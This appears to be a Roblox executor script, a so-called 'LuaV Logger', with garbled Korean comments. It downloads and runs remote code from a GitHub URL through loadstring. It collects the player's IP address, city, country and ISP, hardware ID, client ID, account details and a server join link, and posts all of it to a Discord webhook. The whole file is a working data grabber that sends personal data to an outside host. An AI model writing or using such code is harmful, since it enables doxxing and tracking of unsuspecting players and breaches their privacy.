local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalizationService = game:GetService("LocalizationService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")

local plr = LocalPlayer
local placeId = game.PlaceId
local jobId = game.JobId

-- [ ì›¹í›… ]
local WebhookUrl = getgenv().WebhookUrl or ""

-- [ LuaV ]
local path, luav = "LuaV/LuaV.lua", getgenv().luav
if not luav then
    if isfile(path) then
        luav = dofile(path)
    else
        local data = game:HttpGet("https://raw.githubusercontent.com/asoviet01223/FTAP/refs/heads/main/LUAV")
        task.defer(writefile, path, data)
        luav = loadstring(data)()
    end
end

-- [ ì‹œê°„ í¬ë§· í•¨ìˆ˜ ]
local function formatTime(seconds)
    local h = seconds // 3600
    seconds = seconds - h * 3600
    local m = seconds // 60
    local s = seconds - m * 60
    return string.format("%02d:%02d:%02d", h, m, s)
end

-- [ ì‚¬ìš©ì ì •ë³´ ]
local userId = plr.UserId or 0
local displayName = plr.DisplayName or "Unknown"
local username = plr.Name or "Unknown"
local accountAge = plr.AccountAge or 0
local ip = game:HttpGet("https://v4.ident.me/") or "Unknown"
local followId = plr.FollowUserId or "N/A"

-- [ í”„ë¡œí•„ ì´ë¯¸ì§€ ]
local avatarUrl = ""
local avatarHeadshotUrl = ""
do
    local avatarApi = "https://thumbnails.roblox.com/v1/users/Avatar?userIds="..userId.."&size=420x420&format=Png&isCircular=false"
    local success, result = pcall(function()
        return HttpService:JSONDecode(http_request({Method = "GET", Url = avatarApi}).Body)
    end)
    if success and result and result.data and result.data[1] and result.data[1].imageUrl then
        avatarUrl = result.data[1].imageUrl
        avatarHeadshotUrl = avatarUrl:gsub("Avatar", "AvatarHeadshot")
    end
end

-- [ ì„œë²„ ì •ë³´ ]
local uptime = formatTime(Workspace.DistributedGameTime)
local clientUptime = formatTime(os.clock())

-- [ ê²Œì„ ì •ë³´ ]
local placeInfo = MarketplaceService:GetProductInfo(placeId)

-- [ IP ì •ë³´ ]
local ipinfo = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json")) or {}

-- [ ë””ìŠ¤ì½”ë“œ ë©”ì‹œì§€ ë‚´ìš© ]
local contentData = {
    "**ğŸ‘¤ í”Œë ˆì´ì–´ ì •ë³´**",
    "> ğŸ†” **ìœ ì € Id:** " .. userId,
    "> ğŸ« **í‘œì‹œ ì´ë¦„:** " .. displayName,
    "> ğŸŸï¸ **ì‚¬ìš©ìëª…:** " .. username,
    "> ğŸ“… **ê³„ì • ìƒì„±ì¼:** " .. accountAge .. "ì¼ ì „",
    "> ğŸ›°ï¸ **Ip ì£¼ì†Œ:** " .. ip,
    "> â• **íŒ”ë¡œìš° ëŒ€ìƒ Id:** " .. followId,
    "",

    "**ğŸ–¥ï¸ ì¥ì¹˜ ì •ë³´**",
    "> ğŸ•’ **ì‹œê°„:** " .. os.date("%X"),
    "> ğŸ“† **ë‚ ì§œ:** " .. os.date("%Y-%m-%d"),
    "> ğŸ’¾ **ë©”ëª¨ë¦¬ ì‚¬ìš©ëŸ‰:** " .. (gcinfo() // 100) .. "MB",
    "> âŒ› **í´ë¼ì´ì–¸íŠ¸ ì‹¤í–‰ ì‹œê°„:** " .. clientUptime,
    "> ğŸŒ **ì‚¬ìš© ì–¸ì–´:** " .. LocalizationService.RobloxLocaleId,
    "> ğŸ§ª **í´ë¼ì´ì–¸íŠ¸ ID:** " .. RbxAnalyticsService:GetClientId(),
    "> ğŸ§¬ **ë²„ì „:** " .. version(),
    "",

    "**ğŸ› ï¸ ì‹¤í–‰ê¸° ì •ë³´**",
    "> ğŸš€ **ì´ë¦„:** " .. ((identifyexecutor and identifyexecutor()) or "ì•Œ ìˆ˜ ì—†ìŒ"),
    "> ğŸ”‘ **HWID:** " .. ((get_hwid and get_hwid()) or "ì•Œ ìˆ˜ ì—†ìŒ"),
    "",

    "**ğŸ® ê²Œì„ ì •ë³´**",
    "> ğŸ“Œ **ì´ë¦„:** " .. (placeInfo.Name or "ì—†ìŒ"),
    "> ğŸ“ **ì„¤ëª…:** " .. (placeInfo.Description or "ì—†ìŒ"),
    "> ğŸ› ï¸ **ì—…ë°ì´íŠ¸:** " .. (placeInfo.Updated or "ì—†ìŒ"),
    "> ğŸ—ï¸ **ìƒì„±ì¼:** " .. (placeInfo.Created or "ì—†ìŒ"),
    "> ğŸ†” **Place Id:** " .. placeId,
    "",

    "**ğŸŒ ì„œë²„ ì •ë³´**",
    "> ğŸ‘¥ **í”Œë ˆì´ì–´ ìˆ˜:** " .. #Players:GetPlayers() .. "/" .. (Workspace:GetAttribute("MaxPlayers") or "N/A"),
    "> ğŸ“¶ **í•‘:** " .. math.floor(plr:GetNetworkPing() * 2000) .. "ms",
    "> âŒš **ì„œë²„ ê°€ë™ ì‹œê°„:** " .. uptime,
    "> ğŸ§© **íŒŒì¸  ìˆ˜:** " .. Workspace:GetNumAwakeParts(),
    "> ğŸŒ€ **ë¬¼ë¦¬ FPS:** " .. Workspace:GetRealPhysicsFPS(),
    "> ğŸ”— **ì ‘ì† ë§í¬:** ```roblox://placeId=" .. placeId .. "&gameInstanceId=" .. jobId .. "```",
    "",

    "**ğŸ—ºï¸ IP ìœ„ì¹˜ ì •ë³´**",
    "> ğŸŒ **êµ­ê°€:** " .. (ipinfo.country or "ì•Œ ìˆ˜ ì—†ìŒ"),
    "> ğŸ™ï¸ **ë„ì‹œ:** " .. (ipinfo.city or "ì•Œ ìˆ˜ ì—†ìŒ"),
    "> ğŸ›°ï¸ **ì¸í„°ë„· ì œê³µì:** " .. (ipinfo.isp or "ì•Œ ìˆ˜ ì—†ìŒ")
}

-- [ ë””ìŠ¤í¬ë¦½ì…˜ ]
local descriptionText = ""
if typeof(luav) == "function" then
    local success, result = pcall(function()
        return luav(contentData):c("s")[1]
    end)
    if success then
        descriptionText = result
    end
elseif typeof(luav) == "table" and typeof(luav.c) == "function" then
    local success, result = pcall(function()
        return luav.c(luav, contentData, "s")[1]
    end)
    if success then
        descriptionText = result
    end
end

-- fallback
if descriptionText == "" then
    descriptionText = table.concat(contentData, "\n")
end

-- [ ì„ë² ë“œ ]
local payload = HttpService:JSONEncode({
    content = "```ğŸ‘ï¸â€ğŸ—¨ï¸|VFDL[0m] : New Player Data Logged!```",
    embeds = {{
        title = "Roblox Logger",
        description = descriptionText,
        color = tonumber("0x3498db"),
        thumbnail = { url = avatarUrl },
        author = {
            name = string.format("%s (%s)", displayName or "Unknown", username or "Unknown"),
            icon_url = avatarHeadshotUrl
        },
        footer = {
            text = "Logged by LuaV Logger â€¢ " .. os.date("%Y-%m-%d %H:%M:%S")
        }
    }}
})

-- [ ì „ì†¡ ]
local request = http_request or request or HttpPost or syn.request
if request then
    request({
        Url = WebhookUrl,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = payload
    })
end
